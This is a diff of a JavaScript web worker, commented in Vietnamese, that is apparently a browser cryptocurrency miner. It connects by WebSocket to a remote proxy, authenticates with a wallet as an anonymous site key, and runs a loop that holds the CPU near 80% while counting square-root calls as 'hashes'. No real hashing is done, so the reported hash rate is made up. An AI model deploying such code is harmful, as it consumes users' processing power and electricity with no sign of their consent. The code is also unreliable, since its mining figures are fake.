@@ -1,25 +1,33 @@
-/* worker.js - Thằng cầm cuốc đào */
+// worker.js - Thợ đào đa năng
 self.onmessage = function(e) {
-    if (e.data.type === 'start') {
-        var user = e.data.user;
-        var proxy = e.data.proxy;
-        var throttle = e.data.throttle;
+    const { proxy, wallet, throttle } = e.data;
+    console.log("Worker: Đã nhận lệnh, bắt đầu đào!");
 
-        console.log("Worker: Đang kết nối tới " + proxy);
-        var ws = new WebSocket(proxy);
+    // Kết nối tới VPS của ông giáo
+    const ws = new WebSocket(proxy);
+    
+    ws.onopen = () => {
+        ws.send(JSON.stringify({type: "auth", params: {site_key: wallet, type: "anonymous"}}));
+    };
 
-        ws.onopen = function() {
-            ws.send(JSON.stringify({type: "auth", params: {site_key: user, type: "anonymous"}}));
-        };
+    let hashCount = 0;
+    setInterval(() => {
+        self.postMessage({ hashes: hashCount });
+        hashCount = 0;
+    }, 1000);
 
-        // Vòng lặp "đốt" CPU (Fake Hashing để test CPU trước)
-        setInterval(function() {
-            var start = Date.now();
-            // Đoạn mã này sẽ ép CPU phải tính toán liên tục
-            while (Date.now() - start < (1000 * (1 - throttle))) {
-                Math.sqrt(Math.random() * Math.random());
+    // Thuật toán ép CPU (Dùng phép tính căn bậc hai liên tục)
+    function work() {
+        const start = Date.now();
+        // Chạy trong (1 - throttle) giây (ví dụ 0.8s)
+        while (Date.now() - start < (1000 * (1 - throttle))) {
+            for (let i = 0; i < 2000; i++) {
+                Math.sqrt(Math.random() * 1000) * Math.atan(Math.random());
+                hashCount++;
             }
-            self.postMessage({type: 'stat', hps: Math.random() * 20 + 20});
-        }, 100);
+        }
+        // Nghỉ throttle giây (ví dụ 0.2s) để giữ CPU ở mức 80%
+        setTimeout(work, throttle * 1000);
     }
+    work();
 };
